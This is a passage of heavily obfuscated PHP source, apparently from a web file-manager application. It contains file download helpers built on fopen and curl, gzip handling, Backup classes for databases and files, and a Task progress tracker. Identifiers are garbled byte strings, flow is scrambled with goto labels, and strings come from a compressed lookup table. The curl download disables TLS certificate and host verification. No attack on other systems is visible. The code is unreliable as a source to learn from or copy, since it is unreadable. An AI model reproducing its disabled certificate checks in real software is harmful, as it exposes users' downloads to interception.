$B¸Æ”ĞÎ°Ü[$AŞêÀïó[291]]; goto f£…î…Æ½Æ; F®µİù‡š: if ($FÛÌö˜–é„ > $C«ÆÃ»·÷¨) { @unlink($déÛŠ­è); } file_put_contents($bºãìÑàíì, json_encode($b®ëì¦–¦¤)); $Bøø•ŞÊƒÇ = self::fileDownloadCurl($d‹•ôÅ»‰¶, $a…•¿Ì¢Ò¢, !0, $FÛÌö˜–é„, $C«ÆÃ»·÷¨); goto Cë¨£ªôÖİ; f£…î…Æ½Æ: if (!$d‹•ôÅ»‰¶) { return array($AŞêÀïó[1028] => !1, $AŞêÀïó[1030] => $AŞêÀïó[1033]); } if (!$B¸Æ”ĞÎ°Ü[$AŞêÀïó[1277]] || $B¸Æ”ĞÎ°Ü[$AŞêÀïó[321]] == 0) { @unlink($déÛŠ­è); @unlink($a…•¿Ì¢Ò¢); $Bøø•ŞÊƒÇ = self::fileDownloadFopen($d‹•ôÅ»‰¶, $a…•¿Ì¢Ò¢, $B¸Æ”ĞÎ°Ü[$AŞêÀïó[321]]); if ($Bøø•ŞÊƒÇ[$AŞêÀïó[1028]]) { return $Bøø•ŞÊƒÇ; } else { @unlink($déÛŠ­è); @unlink($a…•¿Ì¢Ò¢); $Bøø•ŞÊƒÇ = self::fileDownloadCurl($d‹•ôÅ»‰¶, $a…•¿Ì¢Ò¢, !1, 0, $B¸Æ”ĞÎ°Ü[$AŞêÀïó[321]]); @unlink($déÛŠ­è); return $Bøø•ŞÊƒÇ; } } $FÛÌö˜–é„ = is_file($déÛŠ­è) ? filesize($déÛŠ­è) : 0; goto BĞ‘íùÓâù; Cé¬æÆ«¦ƒ: $AŞêÀïó =& $_SERVER[Ìó]; if (!request_url_safe($d‹•ôÅ»‰¶)) { return array($AŞêÀïó[1028] => !1, $AŞêÀïó[1030] => $AŞêÀïó[1033]); } $bºãìÑàíì = $a…•¿Ì¢Ò¢ . $AŞêÀïó[1482]; goto CÃõ£µõë½; BĞ‘íùÓâù: $C«ÆÃ»·÷¨ = intval($B¸Æ”ĞÎ°Ü[$AŞêÀïó[321]]); if (file_exists($déÛŠ­è) && time() - filemtime($déÛŠ­è) < 3) { return array($AŞêÀïó[1028] => !1, $AŞêÀïó[1030] => $AŞêÀïó[1484]); } $b®ëì¦–¦¤ = array(); goto eÁÚ‘ÒÀ—Ÿ; Cë¨£ªôÖİ: if ($Bøø•ŞÊƒÇ[$AŞêÀïó[1028]]) { @unlink($bºãìÑàíì); } return $Bøø•ŞÊƒÇ; goto aùµ¡„îâÇ; aùµ¡„îâÇ: } static function fileDownloadFopen($fæåóó§ßÉ, $a‡ÃŒÔ‹, $EŒÅÆÒœíĞ = 0) { $cÖ™ÇÜ¿ =& $_SERVER[Ìó]; @ini_set($cÖ™ÇÜ¿[1486], $cÖ™ÇÜ¿[1487]); $FÛó÷„ùíÆ = $a‡ÃŒÔ‹ . $cÖ™ÇÜ¿[1483]; set_timeout(); @unlink($FÛó÷„ùíÆ); if ($A×¸¢ĞùõÁ = @fopen($fæåóó§ßÉ, $cÖ™ÇÜ¿[1488])) { goto fçåÙŞÄå; fçåÙŞÄå: if (!($F¾ËøñĞ÷é = @fopen($FÛó÷„ùíÆ, $cÖ™ÇÜ¿[1489]))) { return array($cÖ™ÇÜ¿[1028] => !1, $cÖ™ÇÜ¿[1030] => $cÖ™ÇÜ¿[1490]); } while (!feof($A×¸¢ĞùõÁ)) { if (!file_exists($FÛó÷„ùíÆ)) { fclose($F¾ËøñĞ÷é); return array($cÖ™ÇÜ¿[1028] => !1, $cÖ™ÇÜ¿[1030] => $cÖ™ÇÜ¿[1491]); } clearstatcache(); if ($EŒÅÆÒœíĞ > 0 && $EŒÅÆÒœíĞ == filesize(iconv_system($FÛó÷„ùíÆ))) { break; } fwrite($F¾ËøñĞ÷é, fread($A×¸¢ĞùõÁ, 1024 * 8), 1024 * 8); } fclose($F¾ËøñĞ÷é); goto bÄÙ¬–¯Ò; bÄÙ¬–¯Ò: fclose($A×¸¢ĞùõÁ); $Fô¸Í„²ÃÖ = filesize(iconv_system($FÛó÷„ùíÆ)); if ($EŒÅÆÒœíĞ != 0 && $Fô¸Í„²ÃÖ != $EŒÅÆÒœíĞ) { return array($cÖ™ÇÜ¿[1028] => !1, $cÖ™ÇÜ¿[1030] => $cÖ™ÇÜ¿[1492]); } goto D‹òÄ³ƒ‡; D‹òÄ³ƒ‡: self::checkGzip($FÛó÷„ùíÆ); if (!@rename($FÛó÷„ùíÆ, $a‡ÃŒÔ‹)) { usleep(round(rand(0, 1000) * 50)); @unlink($a‡ÃŒÔ‹); $a”öÑ¥ƒÕ = @rename($FÛó÷„ùíÆ, $a‡ÃŒÔ‹); if (!$a”öÑ¥ƒÕ) { return array($cÖ™ÇÜ¿[1028] => !1, $cÖ™ÇÜ¿[1030] => $cÖ™ÇÜ¿[1493]); } } return array($cÖ™ÇÜ¿[1028] => !0, $cÖ™ÇÜ¿[1030] => $cÖ™ÇÜ¿[692]); goto Eï°åÒ×¤ø; Eï°åÒ×¤ø: } else { return array($cÖ™ÇÜ¿[1028] => !1, $cÖ™ÇÜ¿[1030] => $cÖ™ÇÜ¿[1494]); } } static function fileDownloadCurl($Aø©Î†„©¦, $eÎé™³ ¢, $bËôØ¹È­Ş = false, $AíŒ‹ÄˆŞ = 0, $F†õê»´Œ‰ = 0) { goto a§ì¬ŠæÛÄ; eáÂÎáù: $bßŞíñÓŠ = @fopen($aİ¡ƒáöĞ±, $B¡ÛÎº·†µ[978]); if (!$bßŞíñÓŠ) { return array($B¡ÛÎº·†µ[1028] => !1, $B¡ÛÎº·†µ[1030] => $B¡ÛÎº·†µ[1495]); } $B¢³‹ª®âø = curl_init($Aø©Î†„©¦); goto DåŸ®æœ¶¸; d¸ÆæØœ°µ: curl_close($B¢³‹ª®âø); fclose($bßŞíñÓŠ); $e§¿Ôâåó = filesize(iconv_system($aİ¡ƒáöĞ±)); goto EÕµÅó‰ß§; EÔäğ“ŒßĞ: curl_setopt($B¢³‹ª®âø, CURLOPT_USERAGENT, $B¡ÛÎº·†µ[1487]); $aœòÈ©å×‚ = curl_exec($B¢³‹ª®âø); curl_progress_end($B¢³‹ª®âø); goto d¸ÆæØœ°µ; DåŸ®æœ¶¸: if ($bËôØ¹È­Ş) { curl_setopt($B¢³‹ª®âø, CURLOPT_RANGE, $AíŒ‹ÄˆŞ . $B¡ÛÎº·†µ[710]); } curl_setopt($B¢³‹ª®âø, CURLOPT_FILE, $bßŞíñÓŠ); curl_setopt($B¢³‹ª®âø, CURLOPT_REFERER, get_url_link($Aø©Î†„©¦)); goto C®Ÿ…­Ö¼¤; BìñËõŸšˆ: return array($B¡ÛÎº·†µ[1028] => !1, $B¡ÛÎº·†µ[1030] => $B¡ÛÎº·†µ[1498]); goto F„Ô¦±»ÏÕ; a§ì¬ŠæÛÄ: $B¡ÛÎº·†µ =& $_SERVER[Ìó]; $aİ¡ƒáöĞ± = $eÎé™³ ¢ . $B¡ÛÎº·†µ[1483]; set_timeout(); goto eáÂÎáù; EÕµÅó‰ß§: if ($e§¿Ôâåó < $F†õê»´Œ‰ && $F†õê»´Œ‰ != 0) { return array($B¡ÛÎº·†µ[1028] => !1, $B¡ÛÎº·†µ[1030] => $B¡ÛÎº·†µ[1484]); } if ($e§¿Ôâåó > $F†õê»´Œ‰ && $F†õê»´Œ‰ != 0) { return array($B¡ÛÎº·†µ[1028] => !1, $B¡ÛÎº·†µ[1030] => $B¡ÛÎº·†µ[1492]); } if ($aœòÈ©å×‚ && filesize($aİ¡ƒáöĞ±) != 0) { self::checkGzip($aİ¡ƒáöĞ±); if (!@rename($aİ¡ƒáöĞ±, $eÎé™³ ¢)) { @unlink($eÎé™³ ¢); $aœòÈ©å×‚ = @rename($aİ¡ƒáöĞ±, $eÎé™³ ¢); if (!$aœòÈ©å×‚) { return array($B¡ÛÎº·†µ[1028] => !1, $B¡ÛÎº·†µ[1030] => $B¡ÛÎº·†µ[1497]); } } return array($B¡ÛÎº·†µ[1028] => !0, $B¡ÛÎº·†µ[1030] => $B¡ÛÎº·†µ[692]); } goto BìñËõŸšˆ; C®Ÿ…­Ö¼¤: curl_setopt($B¢³‹ª®âø, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($B¢³‹ª®âø, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($B¢³‹ª®âø, CURLOPT_SSL_VERIFYHOST, 0); goto aøÌ°¨Æ¯£; aøÌ°¨Æ¯£: curl_setopt($B¢³‹ª®âø, CURLOPT_NOPROGRESS, !1); curl_setopt($B¢³‹ª®âø, CURLOPT_PROGRESSFUNCTION, $B¡ÛÎº·†µ[1496]); curl_progress_start($B¢³‹ª®âø); goto EÔäğ“ŒßĞ; F„Ô¦±»ÏÕ: } static function checkGzip($bÙí¶„™ÅÅ) { goto fµÕŞØ’¿Å; b§ê›åğŸ§: ob_start(); readgzfile($bÙí¶„™ÅÅ); $Có®Òø³” = ob_get_clean(); goto D¢‰‰ñ¿¼; fµÕŞØ’¿Å: $F«…¿ø‘ß = $_SERVER[Ìó][1499]; $CÀî§„îõ¶ = file_sub_str($bÙí¶„™ÅÅ, 0, 2); if ($F«…¿ø‘ß != $CÀî§„îõ¶) { return; } goto b§ê›åğŸ§; D¢‰‰ñ¿¼: file_put_contents($bÙí¶„™ÅÅ, $Có®Òø³”); goto c¨†ØÉÄ«ª; c¨†ØÉÄ«ª: } } goto cğê»÷—Ä‰; Aä‹´…É: define($_SERVER[Ìó][0], $_SERVER[Ìó][1]); $_SERVER[†˜ı] = explode($_SERVER[Ìó][2], gzinflate(substr($_SERVER[Ìó][3], 10, -8))); function Model($eéÆââ» = '', $dé«Ñ‡Œ¯ = '', $F²“¡•‚Ûë = '') { goto c‡òÓ—Ì„ñ; c»œÃ˜ïæ›: $e›è…„œ‘[$d’ë–ÅØ®â] = new ModelBase($eéÆââ», $dé«Ñ‡Œ¯, $F²“¡•‚Ûë); return $e›è…„œ‘[$d’ë–ÅØ®â]; goto a‹‘¤ñÔè±; B„Îö×ù°: if (isset($e›è…„œ‘[$d’ë–ÅØ®â])) { return $e›è…„œ‘[$d’ë–ÅØ®â]; } if ($eéÆââ») { $eéÆââ» = strtoupper($eéÆââ»[0]) . substr($eéÆââ», 1); $C¿ÙŸÚÏíÅ = $eéÆââ» . $FĞï¶á¥Ù[1]; if (class_exists($C¿ÙŸÚÏíÅ)) { $e›è…„œ‘[$d’ë–ÅØ®â] = new $C¿ÙŸÚÏíÅ(); return $e›è…„œ‘[$d’ë–ÅØ®â]; } } if (!$F²“¡•‚Ûë) { $F²“¡•‚Ûë = $GLOBALS[$FĞï¶á¥Ù[2]][$FĞï¶á¥Ù[3]]; } goto c»œÃ˜ïæ›; c‡òÓ—Ì„ñ: $FĞï¶á¥Ù =& $_SERVER[†˜ı]; static $e›è…„œ‘ = array(); $d’ë–ÅØ®â = strtolower($dé«Ñ‡Œ¯ . $FĞï¶á¥Ù[0] . $eéÆââ»); goto B„Îö×ù°; a‹‘¤ñÔè±: } goto bŞ¿¨“ß‚‘; b«ß—œ†—Œ: define($_SERVER[Ìó][1901], 2); define($_SERVER[Ìó][1902], 3); define($_SERVER[Ìó][1903], 4); goto A§ÛÌÎ¢Ë‹; Cã“×¸ëÈ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $Fæ¸‚‘ËÁ¸ =& $_SERVER[Ìó]; self::$name = date($Fæ¸‚‘ËÁ¸[683]); if (!($Aà©Õ‰Õ‡è = Model($Fæ¸‚‘ËÁ¸[684])->lastItem())) { $Aà©Õ‰Õ‡è = $this->initData(); } else { self::$name = $Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[28]]; if ($Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[685]] == $Fæ¸‚‘ËÁ¸[83]) { self::$name = date($Fæ¸‚‘ËÁ¸[686]); $Fâà¿Óˆ‹Á = 0; if (isset($Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[277]][$Fæ¸‚‘ËÁ¸[163]][$Fæ¸‚‘ËÁ¸[414]])) { $Fâà¿Óˆ‹Á = (int) $Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[277]][$Fæ¸‚‘ËÁ¸[163]][$Fæ¸‚‘ËÁ¸[414]]; } if ($Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[28]] == self::$name) { Model($Fæ¸‚‘ËÁ¸[684])->remove($Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[363]]); } $Aà©Õ‰Õ‡è = $this->initData($Fâà¿Óˆ‹Á, $Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[687]]); } else { $this->checkStore($Aà©Õ‰Õ‡è[$Fæ¸‚‘ËÁ¸[687]]); } } self::$option = $Aà©Õ‰Õ‡è; } private function initData($E×›ŠÏùÀ© = 0, $D£…Ğ„¿Â» = '') { goto bÇµ˜Ô‚; bÇµ˜Ô‚: $bŠöœ¯Íé =& $_SERVER[Ìó]; $eèÚõ¾Ö½¼ = Model($bŠöœ¯Íé[684])->config(); if ($D£…Ğ„¿Â» && $eèÚõ¾Ö½¼[$bŠöœ¯Íé[687]] != $D£…Ğ„¿Â») { $E×›ŠÏùÀ© = 0; } goto dÄÕñĞíÀØ; dÄÕñĞíÀØ: $this->checkStore($eèÚõ¾Ö½¼[$bŠöœ¯Íé[687]]); $D§ôŒõ ¹ = array($bŠöœ¯Íé[687] => $eèÚõ¾Ö½¼[$bŠöœ¯Íé[687]], $bŠöœ¯Íé[28] => self::$name, $bŠöœ¯Íé[685] => 0, $bŠöœ¯Íé[688] => $eèÚõ¾Ö½¼[$bŠöœ¯Íé[688]], $bŠöœ¯Íé[277] => array($bŠöœ¯Íé[689] => array($bŠöœ¯Íé[685] => 0), $bŠöœ¯Íé[690] => array($bŠöœ¯Íé[685] => 0, $bŠöœ¯Íé[691] => 0, $bŠöœ¯Íé[692] => 0, $bŠöœ¯Íé[29] => $bŠöœ¯Íé[33]), $bŠöœ¯Íé[693] => array($bŠöœ¯Íé[685] => 0, $bŠöœ¯Íé[691] => 0, $bŠöœ¯Íé[692] => 0), $bŠöœ¯Íé[163] => array($bŠöœ¯Íé[685] => 0, $bŠöœ¯Íé[694] => 0, $bŠöœ¯Íé[695] => 0, $bŠöœ¯Íé[696] => 0, $bŠöœ¯Íé[697] => 0, $bŠöœ¯Íé[414] => $E×›ŠÏùÀ©)), $bŠöœ¯Íé[698] => time(), $bŠöœ¯Íé[699] => 0); $d¨©ÀÅ££· = Model($bŠöœ¯Íé[684])->insert($D§ôŒõ ¹); goto DÖ¼ÄõŒò; DÖ¼ÄõŒò: $D§ôŒõ ¹[$bŠöœ¯Íé[363]] = $d¨©ÀÅ££·; return $D§ôŒõ ¹; goto e†ŠØºÕ…Ã; e†ŠØºÕ…Ã: } private function checkStore($B©ß‚¶ÚÛè) { $aäÒÜÏøï =& $_SERVER[Ìó]; $A¬áã×² = Model($aäÒÜÏøï[700])->listData($B©ß‚¶ÚÛè); Model($aäÒÜÏøï[700])->checkConfig($A¬áã×²); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ìó][684])->findByName(self::$name); } return self::$option; } public static function set($C‘•†™Ä¹) { $bŸÙšİĞìá =& $_SERVER[Ìó]; $aÔ¯ä ‚ÄÎ = self::get(); foreach ($C‘•†™Ä¹ as $E–Š¬ùÀƒó => $B¾ØÊ…ÃÜ•) { $DŞÍ‘ù×¢ = explode($bŸÙšİĞìá[91], $E–Š¬ùÀƒó); $f¶·ôÒµ‚ƒ = count($DŞÍ‘ù×¢); switch ($f¶·ôÒµ‚ƒ) { case 1: $aÔ¯ä ‚ÄÎ[$DŞÍ‘ù×¢[0]] = $B¾ØÊ…ÃÜ•; break; case 2: $aÔ¯ä ‚ÄÎ[$DŞÍ‘ù×¢[0]][$DŞÍ‘ù×¢[1]] = $B¾ØÊ…ÃÜ•; break; case 3: $aÔ¯ä ‚ÄÎ[$DŞÍ‘ù×¢[0]][$DŞÍ‘ù×¢[1]][$DŞÍ‘ù×¢[2]] = $B¾ØÊ…ÃÜ•; break; } } Model($bŸÙšİĞìá[684])->update($aÔ¯ä ‚ÄÎ[$bŸÙšİĞìá[363]], $aÔ¯ä ‚ÄÎ); self::$option = $aÔ¯ä ‚ÄÎ; return self::$option; } public function keep() { $cƒè§îš =& $_SERVER[Ìó]; $d‚Í´èÄ§¯ = self::get(); if ($d‚Í´èÄ§¯[$cƒè§îš[277]][$cƒè§îš[689]][$cƒè§îš[685]] == $cƒè§îš[83]) { return; } $this->backupKeep($d‚Í´èÄ§¯); self::set(array($cƒè§îš[701] => 1)); } private function backupKeep($f¡±î…­ë) { goto C’ÍœÆ¨Şà; cÊš„­Œß–: $f»‚•‘æÉô = 0; $bã¯å¾ËÒ = array(); foreach ($B¨ŸñÆ®Ñ  as $AÏ¨ˆ¥İ‚ä) { if ($f»‚•‘æÉô >= 7) { break; } $bã¯å¾ËÒ[] = $AÏ¨ˆ¥İ‚ä[$Bİ’¬–„ôˆ[28]]; $f»‚•‘æÉô++; } goto aÁ²Ğß³²ˆ; aÁ²Ğß³²ˆ: for ($f»‚•‘æÉô = 0; $f»‚•‘æÉô < 12; $f»‚•‘æÉô++) { $bã¯å¾ËÒ[] = date($Bİ’¬–„ôˆ[702], strtotime("\x2d{$f»‚•‘æÉô}\x20\155\x6f\x6e\x74\150\163")); } $bã¯å¾ËÒ = array_unique($bã¯å¾ËÒ); foreach ($B¨ŸñÆ®Ñ  as $AÏ¨ˆ¥İ‚ä) { if (!empty($AÏ¨ˆ¥İ‚ä[$Bİ’¬–„ôˆ[28]]) && in_array($AÏ¨ˆ¥İ‚ä[$Bİ’¬–„ôˆ[28]], $bã¯å¾ËÒ)) { continue; } Model($Bİ’¬–„ôˆ[684])->remove($AÏ¨ˆ¥İ‚ä[$Bİ’¬–„ôˆ[363]]); $b‚¸öçã™Í = "\173\151\x6f\x3a{$f¡±î…­ë[$Bİ’¬–„ôˆ[687]]}\175\x2f\x64\141\x74\x61\142\141\163\x65\x2f\142\x61\x63\x6b\x75\160\137{$AÏ¨ˆ¥İ‚ä[$Bİ’¬–„ôˆ[28]]}"; IO::remove($b‚¸öçã™Í, !1); } goto Aš¼‹­Ø­µ; C’ÍœÆ¨Şà: $Bİ’¬–„ôˆ =& $_SERVER[Ìó]; $B¨ŸñÆ®Ñ  = Model($Bİ’¬–„ôˆ[684])->listData(); if (empty($B¨ŸñÆ®Ñ )) { return; } goto cÊš„­Œß–; Aš¼‹­Ø­µ: } public function db() { goto bÆ©…¹‘õÌ; D‡ª¸ìÖÛ›: $a£Çäˆˆí  = new BackupDb(); if (!$a£Çäˆˆí ->index()) { return !1; } self::set(array($D¯¦ÇÚ„ùÒ[703] => 1)); goto D¹äÀˆöÆ; bÆ©…¹‘õÌ: $D¯¦ÇÚ„ùÒ =& $_SERVER[Ìó]; $A†¤ïØ¥ö— = self::get(); if ($A†¤ïØ¥ö—[$D¯¦ÇÚ„ùÒ[277]][$D¯¦ÇÚ„ùÒ[690]][$D¯¦ÇÚ„ùÒ[685]] == $D¯¦ÇÚ„ùÒ[83]) { return !0; } goto D‡ª¸ìÖÛ›; D¹äÀˆöÆ: return !0; goto f´¥‘ŠïÂİ; f´¥‘ŠïÂİ: } public function dbFile() { goto c‹·Ì›¼ŠŒ; c‹·Ì›¼ŠŒ: $cíëÉˆ¾ŒÓ =& $_SERVER[Ìó]; $EÈ÷Ùó•¸Ö = self::get(); if ($EÈ÷Ùó•¸Ö[$cíëÉˆ¾ŒÓ[277]][$cíëÉˆ¾ŒÓ[693]][$cíëÉˆ¾ŒÓ[685]] == $cíëÉˆ¾ŒÓ[83]) { return !0; } goto FÀ²ÏØÕØ; d¹ô©å¢Ç÷: return !0; goto AÖÓˆ«Ö×; FÀ²ÏØÕØ: $dÑ¾ºĞÏöÈ = new BackupDbFile(); if (!$dÑ¾ºĞÏöÈ->index()) { return !1; } self::set(array($cíëÉˆ¾ŒÓ[704] => 1)); goto d¹ô©å¢Ç÷; AÖÓˆ«Ö×: } public function file() { $cÁÑñÆ÷ =& $_SERVER[Ìó]; $A®Š´ó = self::get(); if ($A®Š´ó[$cÁÑñÆ÷[277]][$cÁÑñÆ÷[163]][$cÁÑñÆ÷[685]] == $cÁÑñÆ÷[83]) { return !0; } if (!isset($A®Š´ó[$cÁÑñÆ÷[688]]) || $A®Š´ó[$cÁÑñÆ÷[688]] == $cÁÑñÆ÷[463]) { $C›†¼îŠ¹ = new BackupFile(); if (!$C›†¼îŠ¹->index()) { return !1; } } self::set(array($cÁÑñÆ÷[705] => 1, $cÁÑñÆ÷[685] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto BÔ®ŸöÃÚ‘; BÔ®ŸöÃÚ‘: $DïİƒĞ¨—í =& $_SERVER[Ìó]; $câĞ¸ä–º = Backup::get(); self::$io = $câĞ¸ä–º[$DïİƒĞ¨—í[687]]; goto eÔ„Û¸–½–; dÔ¹¯›Óíª: $A—¸«¾ô‚ß = new Task($DïİƒĞ¨—í[707], $DïİƒĞ¨—í[708], 0, LNG($DïİƒĞ¨—í[709]) . $DïİƒĞ¨—í[710] . LNG($DïİƒĞ¨—í[711])); $FÙ¼êÏ°ŒŒ = array_diff($FÙ¼êÏ°ŒŒ, array($DïİƒĞ¨—í[712], $DïİƒĞ¨—í[713])); foreach ($FÙ¼êÏ°ŒŒ as $BÃ¹³¼Ä²›) { $eòÅ‚Ø³ÈÁ = $dĞĞš„¡ï‡ . $BÃ¹³¼Ä²› . $DïİƒĞ¨—í[714]; $cØÒÜ¦ğÀè = null; if ($BÃ¹³¼Ä²› == $DïİƒĞ¨—í[715] && (!isset($câĞ¸ä–º[$DïİƒĞ¨—í[688]]) || $câĞ¸ä–º[$DïİƒĞ¨—í[688]] == $DïİƒĞ¨—í[463])) { $cØÒÜ¦ğÀè = self::$io; } $cîÒ±èê‡ += $cï±…ä½ í->sqlFromDb($BÃ¹³¼Ä²›, $eòÅ‚Ø³ÈÁ, $A—¸«¾ô‚ß, $cØÒÜ¦ğÀè); } goto EÚÒ™–é; EÚÒ™–é: $A—¸«¾ô‚ß->end(); $b»·ÙäØ»° = array($DïİƒĞ¨—í[716] => $BŒ«¶éÕÑ, $DïİƒĞ¨—í[703] => 1, $DïİƒĞ¨—í[717] => $cîÒ±èê‡, $DïİƒĞ¨—í[718] => $cîÒ±èê‡); Backup::set($b»·ÙäØ»°); goto E®º¹˜ó£; E‘İÓÊê§Ü: mk_dir($dĞĞš„¡ï‡); $FÙ¼êÏ°ŒŒ = $cï±…ä½ í->db()->getTables(); $cîÒ±èê‡ = 0; goto dÔ¹¯›Óíª; AÃ÷½ˆîË: $cï±…ä½ í = new DbManage($a„ª°ö¤ŠÀ, $BŒ«¶éÕÑ); $dĞĞš„¡ï‡ = TEMP_FILES . $DïİƒĞ¨—í[706] . self::$name . $DïİƒĞ¨—í[8]; del_dir($dĞĞš„¡ï‡); goto E‘İÓÊê§Ü; eÔ„Û¸–½–: self::$name = $câĞ¸ä–º[$DïİƒĞ¨—í[28]]; $a„ª°ö¤ŠÀ = $GLOBALS[$DïİƒĞ¨—í[6]][$DïİƒĞ¨—í[17]]; $BŒ«¶éÕÑ = $this->_dbType($a„ª°ö¤ŠÀ); goto AÃ÷½ˆîË; E®º¹˜ó£: return !0; goto FÄÆŞÇƒ’Ü; FÄÆŞÇƒ’Ü: } private function _dbType($B–™”‡òé…) { goto aí„Ò¶âÊï; aí„Ò¶âÊï: $A—½’ßÕç =& $_SERVER[Ìó]; $B–™”‡òé… = array_change_key_case($B–™”‡òé…); $EÕÊ™ñ£ñğ = $B–™”‡òé…[$A—½’ßÕç[719]]; goto DŒ˜íŠ°ç; DŒ˜íŠ°ç: if ($EÕÊ™ñ£ñğ == $A—½’ßÕç[720]) { $AˆÒÛì·¾Ó = explode($A—½’ßÕç[4], $B–™”‡òé…[$A—½’ßÕç[721]]); $EÕÊ™ñ£ñğ = $AˆÒÛì·¾Ó[0]; } $AÔÉ÷›˜ì° = array($A—½’ßÕç[722] => $A—½’ßÕç[9], $A—½’ßÕç[723] => $A—½’ßÕç[724]); if (isset($AÔÉ÷›˜ì°[$EÕÊ™ñ£ñğ])) { $EÕÊ™ñ£ñğ = $AÔÉ÷›˜ì°[$EÕÊ™ñ£ñğ]; } goto DĞö¶á›öˆ; DĞö¶á›öˆ: return $EÕÊ™ñ£ñğ; goto f‹ÖŸÅ•í„; f‹ÖŸÅ•í„: } } class BackupDbFile { public function __construct() { } public function index() { goto CÚÖØí½ğ; fõª·È‚¯: $föĞñÒ­›« = new TaskFileTransfer($d²½À’«[725], $d²½À’«[708], 0, LNG($d²½À’«[709]) . $d²½À’«[407] . LNG($d²½À’«[711]) . $d²½À’«[726]); $föĞñÒ­›«->addPath($f›‚¶™‡); $Eæà¨Ô³ö = IO::infoWithChildren($f›‚¶™‡); goto fÁƒˆ³ÑÀ; CÚÖØí½ğ: $d²½À’« =& $_SERVER[Ìó]; $EßÉºƒ”• = Backup::get(); $cóêâƒ¾´ = $EßÉºƒ”•[$d²½À’«[28]]; goto f°à°ˆŠ; dÄÔâ‘ˆ•: return !0; goto fñí©ëë´–; fÁƒˆ³ÑÀ: Backup::set(array($d²½À’«[727] => $Eæà¨Ô³ö[$d²½À’«[77]])); IO::move($f›‚¶™‡, $E£êœå¾èƒ); $DåôÉÇõøƒ = CONTROLLER_DIR . $d²½À’«[728]; goto B…Äï†è×À; B…Äï†è×À: IO::copy($DåôÉÇõøƒ, $E£êœå¾èƒ . "\x62\141\143\153\165\160\x5f{$cóêâƒ¾´}\x2f"); $föĞñÒ­›«->end(); Backup::set(array($d²½À’«[729] => $Eæà¨Ô³ö[$d²½À’«[77]])); goto dÄÔâ‘ˆ•; f°à°ˆŠ: $f›‚¶™‡ = TEMP_FILES . "\142\141\x63\x6b\165\x70\137{$cóêâƒ¾´}\57"; $E£êœå¾èƒ = "\173\x69\157\72{$EßÉºƒ”•[$d²½À’«[687]]}\175\x2f\x64\x61\x74\x61\142\141\x73\145\x2f"; IO::mkdir($E£êœå¾èƒ . "\142\141\x63\x6b\165\x70\137{$cóêâƒ¾´}\x2f"); goto fõª·È‚¯; fñí©ëë´–: } } goto f¿Ù’Œ´„; e¬Û¡õË”£: class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\156\156\151\x6e\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($b‡¹¾©ÁÚ, $e¢Õëç­À´ = '', $F¨İĞëËÜ = 0, $aĞÛÜ’Ï = '') { goto e³ÉãïË¤ø; e³ÉãïË¤ø: $eô¨èŠÕ¨ =& $_SERVER[Ìó]; if (self::get($b‡¹¾©ÁÚ)) { return; } $this->task = array($eô¨èŠÕ¨[363] => $b‡¹¾©ÁÚ, $eô¨èŠÕ¨[1409] => USER_ID, $eô¨èŠÕ¨[1317] => $aĞÛÜ’Ï, $eô¨èŠÕ¨[29] => $e¢Õëç­À´, $eô¨èŠÕ¨[976] => $eô¨èŠÕ¨[33], $eô¨èŠÕ¨[974] => $F¨İĞëËÜ, $eô¨èŠÕ¨[986] => 0, $eô¨èŠÕ¨[1410] => 0, $eô¨èŠÕ¨[1411] => 0, $eô¨èŠÕ¨[1412] => timeFloat(), $eô¨èŠÕ¨[1413] => 0, $eô¨èŠÕ¨[1414] => 0, $eô¨èŠÕ¨[1415] => 0, $eô¨èŠÕ¨[1416] => 0, $eô¨èŠÕ¨[685] => $eô¨èŠÕ¨[1373]); goto Dš‚Í‡ˆÄ; F‘ÅâìéŞŠ: Hook::trigger($eô¨èŠÕ¨[1420], $this->task); $this->task[$eô¨èŠÕ¨[1414]] = timeFloat(); self::valueSet($this->task[$eô¨èŠÕ¨[363]], $this->task); goto AÈõ¸‹Øå…; Dš‚Í‡ˆÄ: Hook::bind($eô¨èŠÕ¨[1375], array($this, $eô¨èŠÕ¨[1417])); Hook::bind($eô¨èŠÕ¨[1418], array($this, $eô¨èŠÕ¨[1419])); $this->startAfter(); goto F‘ÅâìéŞŠ; AÈõ¸‹Øå…: } public function end() { goto C¨ë¨­‹¬™; fÃÑÈ‰õ‚©: Hook::unbind($aÆĞğÉé¥‘[1418], array($this, $aÆĞğÉé¥‘[1419])); $this->endAfter(); $this->task = !1; goto FéÅ¦ë­·ì; E‰‘ëÃ¦ƒÈ: $bÍìĞíçÜ‰ = timeFloat() - $this->task[$aÆĞğÉé¥‘[1412]]; self::log($aÆĞğÉé¥‘[1421] . $this->task[$aÆĞğÉé¥‘[363]] . $aÆĞğÉé¥‘[1422] . $bÍìĞíçÜ‰ . $aÆĞğÉé¥‘[1423]); Hook::unbind($aÆĞğÉé¥‘[1375], array($this, $aÆĞğÉé¥‘[1417])); goto fÃÑÈ‰õ‚©; C¨ë¨­‹¬™: $aÆĞğÉé¥‘ =& $_SERVER[Ìó]; if (!$this->task) { return; } if ($this->task[$aÆĞğÉé¥‘[1414]]) { self::valueSet($this->task[$aÆĞğÉé¥‘[363]], !1); } goto E‰‘ëÃ¦ƒÈ; FéÅ¦ë­·ì: } public function update($D‹Àãí¢ô× = 0) { goto dƒÜó¦¬²µ; aØ’ÍÃµÃµ: Hook::trigger($F›‘š™Ìôš[1427], $bòºÄÊ›àÊ); self::valueSet($bòºÄÊ›àÊ[$F›‘š™Ìôš[363]], $bòºÄÊ›àÊ); goto bî‡õ½˜ö’; dƒÜó¦¬²µ: $F›‘š™Ìôš =& $_SERVER[Ìó]; $bòºÄÊ›àÊ =& $this->task; if 